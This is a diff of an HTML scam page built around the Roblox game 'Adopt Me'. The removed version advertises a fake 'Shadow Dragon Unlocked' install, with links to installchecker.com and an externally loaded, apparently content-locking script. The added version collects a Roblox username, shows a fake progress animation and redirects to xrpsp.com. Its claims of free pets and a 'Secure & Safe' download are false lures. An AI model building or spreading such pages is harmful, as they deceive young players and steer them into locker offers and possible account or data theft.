@@ -1,288 +1,171 @@
 <!DOCTYPE html>
-<html lang="en" dir="ltr">
+<html lang="en">
 <head>
-    
-    <script type="text/javascript">
-    var krWSO_tuV_aNJvKc={"it":4581469,"key":"9e77f"};
-</script>
-<script src="https://da4talg8ap14y.cloudfront.net/d27320a.js"></script>
-    
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roblox Adopt Me Shadow Dragon</title>
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
-    <style>
-        :root {
-            --primary-color: #0A192F;
-            --secondary-color: #122238;
-            --accent-color: #64FFDA;
-            --text-color: #CCD6F6;
-            --light-text: #8892B0;
-        }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Continue</title>
 
-        body {
-            font-family: 'Roboto', sans-serif;
-            background-color: var(--primary-color);
-            color: var(--text-color);
-            margin: 0;
-            padding: 0;
-            direction: ltr;
-            line-height: 1.6;
-        }
+<style>
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    font-family: Arial, sans-serif;
+}
 
-        .container {
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 20px;
-        }
-        
-        /* Header & Main Section */
-        header {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 20px 0;
-        }
+body {
+    height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    background: url('https://i.postimg.cc/d1w82kyx/e3ba27fdede8810c0124fc960a0b15b9.jpg') no-repeat center/cover;
+    position: relative;
+}
 
-        .logo {
-            font-size: 28px;
-            font-weight: bold;
-            color: var(--accent-color);
-        }
+body::before {
+    content: "";
+    position: absolute;
+    width: 100%;
+    height: 100%;
+    backdrop-filter: blur(8px);
+    background: rgba(0,0,0,0.5);
+}
 
-        /* Main Content with split layout */
-        .main-content {
-            display: flex;
-            flex-direction: row;
-            align-items: center;
-            gap: 50px;
-            margin-top: 50px;
-            padding: 40px;
-            background-color: var(--secondary-color);
-            border-radius: 15px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
-        }
-        
-        .image-container {
-            flex: 1;
-            text-align: center;
-        }
-        
-        .image-container img {
-            max-width: 100%;
-            height: auto;
-            border-radius: 10px;
-            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.4);
-        }
+/* Container */
+.container {
+    position: relative;
+    z-index: 2;
+    width: 90%;
+    max-width: 350px;
+    padding: 25px;
+    border-radius: 20px;
+    background: rgba(255,255,255,0.08);
+    backdrop-filter: blur(10px);
+    text-align: center;
+}
 
-        .text-container {
-            flex: 1;
-            padding: 20px;
-        }
+/* Logo */
+.logo {
+    width: 80px;
+    height: 80px;
+    border-radius: 20px;
+    object-fit: cover;
+    margin-bottom: 15px;
+}
 
-        .game-title {
-            font-size: 44px;
-            color: var(--text-color);
-            margin-bottom: 10px;
-            font-weight: 700;
-        }
+h2 {
+    color: white;
+    margin-bottom: 15px;
+}
 
-        .game-subtitle {
-            font-size: 20px;
-            color: var(--light-text);
-            margin-bottom: 25px;
-        }
-        
-        .cta-button {
-            display: inline-block;
-            background-color: var(--accent-color);
-            color: var(--primary-color);
-            padding: 15px 40px;
-            border-radius: 5px;
-            text-decoration: none;
-            font-weight: bold;
-            font-size: 18px;
-            transition: background-color 0.3s ease, transform 0.3s ease;
-            box-shadow: 0 5px 15px rgba(100, 255, 218, 0.4);
-        }
+input {
+    width: 100%;
+    padding: 12px;
+    border-radius: 10px;
+    border: none;
+    margin-bottom: 15px;
+    font-size: 16px;
+}
 
-        .cta-button:hover {
-            background-color: #7affc8;
-            transform: translateY(-3px);
-            box-shadow: 0 8px 20px rgba(100, 255, 218, 0.6);
-        }
+button {
+    width: 100%;
+    padding: 12px;
+    border-radius: 10px;
+    border: none;
+    background: #FFD700;
+    color: white;
+    font-size: 16px;
+    font-weight: bold;
+    cursor: pointer;
+}
 
-        /* Features Section */
-        .features-section {
-            margin-top: 60px;
-        }
+/* Loader */
+.loader-container {
+    display: none;
+    margin-top: 20px;
+    flex-direction: column;
+    align-items: center;
+}
 
-        .features-section h2 {
-            text-align: center;
-            font-size: 32px;
-            color: var(--text-color);
-            margin-bottom: 40px;
-        }
+/* Circle */
+.circle {
+    width: 90px;
+    height: 90px;
+    border: 6px solid rgba(255,255,255,0.2);
+    border-top: 6px solid #FFD700;
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
 
-        .features-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
-            gap: 30px;
-        }
+    display: flex;
+    justify-content: center;
+    align-items: center;
+}
 
-        .feature-item {
-            background-color: var(--secondary-color);
-            padding: 30px;
-            border-radius: 10px;
-            text-align: center;
-            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
-            transition: transform 0.3s ease;
-        }
-        
-        .feature-item:hover {
-            transform: translateY(-5px);
-        }
+/* Percentage في الوسط */
+.percent {
+    color: white;
+    font-size: 18px;
+    font-weight: bold;
+}
 
-        .feature-item h3 {
-            font-size: 20px;
-            color: var(--accent-color);
-            margin-top: 15px;
-        }
+/* Status */
+.status {
+    color: white;
+    margin-top: 10px;
+    font-size: 14px;
+}
 
-        .feature-item p {
-            color: var(--light-text);
-            font-size: 15px;
-        }
-        
-        .feature-icon {
-            font-size: 40px;
-            color: var(--accent-color);
-        }
-        
-        /* Stats section */
-        .stats-section {
-            margin-top: 50px;
-            text-align: center;
-        }
-
-        .stats-grid {
-            display: flex;
-            justify-content: center;
-            gap: 50px;
-            flex-wrap: wrap;
-        }
-        
-        .stat-item {
-            font-size: 18px;
-            font-weight: bold;
-        }
-
-        .stat-item .icon {
-            font-size: 24px;
-            margin-right: 5px;
-        }
-        
-        /* --- Mobile Responsiveness --- */
-        @media (max-width: 768px) {
-            .main-content {
-                flex-direction: column;
-                text-align: center;
-                gap: 30px;
-                padding: 20px;
-            }
-            
-            .text-container {
-                padding: 0;
-            }
-            
-            .game-title {
-                font-size: 36px;
-            }
-            
-            .game-subtitle {
-                font-size: 18px;
-            }
-
-            .features-grid {
-                grid-template-columns: 1fr;
-            }
-        }
-    </style>
+@keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+}
+</style>
 </head>
-<body>
-    <div class="container">
-        <header>
-            <div class="logo"></div>
-        </header>
 
-        <main>
-            <section class="main-content">
-                <div class="image-container">
-                    <img src="https://i.postimg.cc/jd0DpnGG/file-00000000a780722fb63cfe7c0bc96782.png" alt="Adopt Me">
-                </div>
-                <div class="text-container">
-                    <h1 class="game-title">ADOPT ME (Shadow Dragon Unlocked)</h1>
-                    
-                    <a href="https://installchecker.com/cl/v/7j7n9v" class="cta-button">Install Now</a>
-				
-                    <p class="game-subtitle">What's special about this version of Adopt Me:</p>🐾 Free Pets:
-This version lets you get free pets without long grinding or spending Robux, helping you grow your collection faster.
-🐉 Shadow Dragon Available:
-One of the rarest and most wanted pets in Adopt Me! This version gives you special access to obtain the Shadow Dragon, something not possible in the normal game.
-⚡ Faster Progress:
-Earn Bucks more easily, unlock houses, items, and pets faster, and enjoy a quicker journey through the game.
-🎮 Smooth Gameplay:
-Optimized for smooth performance with minimal lag, so you can enjoy trading, adopting, and role-playing without interruptions.
-🤝 Trading Advantage:
-Having rare pets like the Shadow Dragon gives you a big advantage when trading with other players.
-                    <p>
-                        
-                    </p>
-                    <a href="javascript:void(0)" class="cta-button" onclick="_nS()">Install Now</a>
-                   
-                    <div class="stats-section">
-                        <div class="stats-grid">
-                            <div class="stat-item">
-                                <i class="fab fa-android icon" style="color: #3DDC84;"></i>
-                                Android
-                            </div>
-                            <div class="stat-item">
-                                <i class="fab fa-apple icon" style="color: #BDBDBD;"></i>
-                                iOS
-                            </div>
-                            <div class="stat-item">
-                                <i class="fas fa-star icon" style="color: #FFD700;"></i>
-                                8.5 / 10
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            </section>
-            
-            <section class="features-section">
-                <h2>Why Play This Game?</h2>
-                <div class="features-grid">
-                    <div class="feature-item">
-                        <i class="fas fa-shield-alt feature-icon"></i>
-                        <h3>Secure & Safe</h3>
-                        <p>Enjoy a secure and risk-free gaming experience.</p>
-                    </div>
-                    <div class="feature-item">
-                        <i class="fas fa-gift feature-icon"></i>
-                        <h3>Exclusive Rewards</h3>
-                        <p>Get special gifts and bonuses you won't find anywhere else.</p>
-                    </div>
-                    <div class="feature-item">
-                        <i class="fas fa-tachometer-alt feature-icon"></i>
-                        <h3>Smooth Performance</h3>
-                        <p>Experience fast and seamless gameplay on your device.</p>
-                    </div>
-                </div>
-            </section>
-        </main>
+<body>
+
+<div class="container">
+
+    <img src="https://i.postimg.cc/tCyLs2JD/Picsart-26-03-17-23-21-42-682.jpg" class="logo">
+
+    <h2>Enter your Roblox Username</h2>
+
+    <input type="text" id="username" placeholder="Username...">
+
+    <button onclick="start()">Continue</button>
+
+    <div class="loader-container" id="loader">
+        <div class="circle">
+            <div class="percent" id="percent">0%</div>
+        </div>
+        <div class="status">Finding user...</div>
     </div>
+
+</div>
+
+<script>
+function start() {
+    let username = document.getElementById("username").value;
+
+    if(username.trim() === "") {
+        alert("Please enter your username");
+        return;
+    }
+
+    document.getElementById("loader").style.display = "flex";
+
+    let percent = 0;
+    let interval = setInterval(() => {
+        percent++;
+        document.getElementById("percent").innerText = percent + "%";
+
+        if(percent >= 100) {
+            clearInterval(interval);
+            window.location.href = "https://xrpsp.com/adoptme";
+        }
+    }, 30);
+}
+</script>
+
 </body>
 </html>
